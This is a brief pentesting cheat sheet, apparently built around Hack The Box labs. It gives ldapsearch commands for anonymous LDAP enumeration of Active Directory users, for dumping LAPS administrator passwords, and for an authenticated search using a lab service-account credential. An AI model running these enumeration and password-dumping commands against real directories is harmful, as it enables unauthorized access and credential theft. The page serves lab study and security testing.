# LDAP

## ldapsearch

### anonymous authentication&#x20;

If server accepts anonymous authentication

{% code overflow="wrap" %}
```bash
# gets all attributes
ldapsearch -x -h 10.10.10.161 -b "dc=htb,dc=local" "*" #i.e. domain = htb.local
# find user accounts
ldapsearch -x -h 10.10.10.161 -b "dc=htb,dc=local" "objectclass=user"
# get possible username
ldapsearch -x -h 10.10.10.161 -b "dc=htb,dc=local" "objectclass=user" sAMAccountName | grep sAMAccountName | awk -F ": " '{print $2}'
# dump LAPS passwords
ldapsearch -D user@htb.local -w PASSWORD -o ldif-wrap=no -b 'dc=htb,dc=local' -h 10.10.10.123 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
{% endcode %}

search LDAP with admin account

{% code overflow="wrap" %}
```bash
ldapsearch -x -h 10.10.10.100 -p 389 -D SVC_TGS -w GPPstillStandingStrong2k18 -b "dc=active,dc=htb"
```
{% endcode %}

## Resources

{% embed url="https://vk9-sec.com/enumerating-ad-users-with-ldap/" %}

{% embed url="https://infinitelogins.com/2020/12/09/enumerating-ldap-port-389/" %}

{% embed url="https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/" %}
